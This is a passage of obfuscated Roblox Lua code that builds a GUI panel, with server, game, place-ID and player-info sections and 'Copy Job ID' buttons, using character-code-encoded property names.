_llza[_sc(53,102)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(53,57)]);
_llza[_sc(53,102)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(53,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(53,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(53,102)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(53,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(53,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(53,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(53,102)][_sc(84,101,120,116)]=[[Copy Job ID]];
_llza[_sc(53,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(53,102)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(53,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(54,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(53,102)]);
_llza[_sc(54,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(54,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(53,56)]);
_llza[_sc(54,49)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(54,49)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(54,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,49)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(54,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(54,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,100)]);
_llza[_sc(54,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(54,50)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(54,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,50)][_sc(78,97,109,101)]=[[GameName]];
_llza[_sc(54,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(54,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(54,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,51)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(54,50)]);
_llza[_sc(54,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(54,51)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(54,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(54,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(54,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,51)][_sc(84,101,120,116)]=[[Game: --]];
_llza[_sc(54,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(54,51)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(54,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(54,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(54,51)]);
_llza[_sc(54,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(54,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(54,51)]);
_llza[_sc(54,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(54,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,100)]);
_llza[_sc(54,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(54,54)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(54,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,54)][_sc(78,97,109,101)]=[[PlaceID]];
_llza[_sc(54,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(54,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(54,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,55)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(54,54)]);
_llza[_sc(54,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(54,55)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(54,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(54,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(54,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,55)][_sc(84,101,120,116)]=[[Place ID: --]];
_llza[_sc(54,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(54,55)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(54,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(54,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(54,55)]);
_llza[_sc(54,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(54,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(54,55)]);
_llza[_sc(54,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(54,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,100)]);
_llza[_sc(54,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(54,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(54,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,97)][_sc(78,97,109,101)]=[[Server]];
_llza[_sc(54,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(54,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(54,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(54,97)]);
_llza[_sc(54,98)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(54,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(54,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(54,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(54,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(54,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(54,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(54,98)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(54,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(54,98)]);
_llza[_sc(54,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(54,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(54,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(54,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(54,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(54,98)]);
_llza[_sc(54,100)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(54,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(54,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(54,100)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(54,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(54,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(54,100)]);
_llza[_sc(54,101)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(54,101)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(54,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(54,100)]);
_llza[_sc(54,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(54,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(54,102)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(54,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(54,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(54,102)]);
_llza[_sc(55,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(55,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(55,49)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(54,98)]);
_llza[_sc(55,49)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(55,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(55,49)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(55,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(55,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55,49)][_sc(84,101,120,116)]=[[Copy Job ID]];
_llza[_sc(55,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(55,49)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(55,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(55,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(55,49)]);
_llza[_sc(55,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(55,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(54,97)]);
_llza[_sc(55,51)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(55,51)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(55,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55,51)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(55,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(55,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,97)]);
_llza[_sc(55,52)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(55,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55,52)][_sc(78,97,109,101)]=[[leftside]];
_llza[_sc(55,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(55,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(-0.00038, 0, 0, 0);
_llza[_sc(55,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,53)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(55,52)]);
_llza[_sc(55,53)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(55,53)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(55,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(55,52)]);
_llza[_sc(55,54)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 160);
_llza[_sc(55,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55,54)][_sc(78,97,109,101)]=[[playerinfoTab]];
_llza[_sc(55,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(55,55)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(55,54)]);
_llza[_sc(55,55)][_sc(78,97,109,101)]=_sc(112,108,97,121,101,114,105,110,102,111,83,99,114,105,112,116);
_llza[_sc(55,56)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(55,54)]);
_llza[_sc(55,56)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(55,56)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(55,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(55,54)]);
_llza[_sc(55,57)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(55,57)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(55,57)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(55,57)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(55,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(55,54)]);
_llza[_sc(55,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(55,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55,97)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(55,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(55,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(55,97)]);
_llza[_sc(55,98)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(55,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55,98)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(55,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(55,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(55,99)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(55,98)]);
_llza[_sc(55,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(55,54)]);
_llza[_sc(55,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(55,100)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(55,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55,100)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(55,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(55,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(55,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,101)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(55,100)]);
_llza[_sc(55,101)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(55,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(55,101)][_sc(84,101,120,116,83,99,97,108,101,100)]=true;
_llza[_sc(55,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(55,101)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(55,101)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(55,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(55,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, -0.13333, 15);
_llza[_sc(55,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(55,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(55,101)][_sc(84,101,120,116)]=[[Welcome,]];
_llza[_sc(55,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(55,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(55,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(55,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(55,101)]);
_llza[_sc(55,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(56,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(55,101)]);
_llza[_sc(56,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(56,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(55,54)]);
_llza[_sc(56,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 70);
_llza[_sc(56,49)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(56,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(56,49)][_sc(78,97,109,101)]=[[playerinfo]];
_llza[_sc(56,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(56,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(56,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(56,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,50)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(56,49)]);
_llza[_sc(56,50)][_sc(78,97,109,101)]=_sc(112,108,97,121,101,114,105,110,102,111);
_llza[_sc(56,51)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(56,49)]);
_llza[_sc(56,51)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(56,52)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(56,49)]);
_llza[_sc(56,52)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(56,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(56,52)][_sc(84,101,120,116,83,99,97,108,101,100)]=true;
_llza[_sc(56,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(56,52)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(56,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(56,52)][_sc(83,105,122,101)]=UDim2.new(0, 100, 0, 13);
_llza[_sc(56,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(56,52)][_sc(84,101,120,116)]=[[XXXXX]];
_llza[_sc(56,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(56,52)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(56,52)][_sc(78,97,109,101)]=[[display]];
_llza[_sc(56,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0, 2);
_llza[_sc(56,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(56,52)]);
_llza[_sc(56,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(56,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(56,52)]);
_llza[_sc(56,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(56,55)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(56,49)]);
_llza[_sc(56,55)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(56,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(56,55)][_sc(84,101,120,116,83,99,97,108,101,100)]=true;
_llza[_sc(56,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(56,55)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(56,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(56,55)][_sc(83,105,122,101)]=UDim2.new(0, 100, 0, 13);
_llza[_sc(56,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(56,55)][_sc(84,101,120,116)]=[[@xxxxx]];
_llza[_sc(56,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(56,55)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(56,55)][_sc(78,97,109,101)]=[[username]];
_llza[_sc(56,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0, 17);
_llza[_sc(56,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(56,55)]);
_llza[_sc(56,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(56,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(56,55)]);
_llza[_sc(56,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(56,97)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(56,49)]);
_llza[_sc(56,97)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(56,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(56,97)][_sc(84,101,120,116,83,99,97,108,101,100)]=true;
_llza[_sc(56,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(56,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(56,97)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(56,97)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(56,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 13);
_llza[_sc(56,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(201, 201, 201);
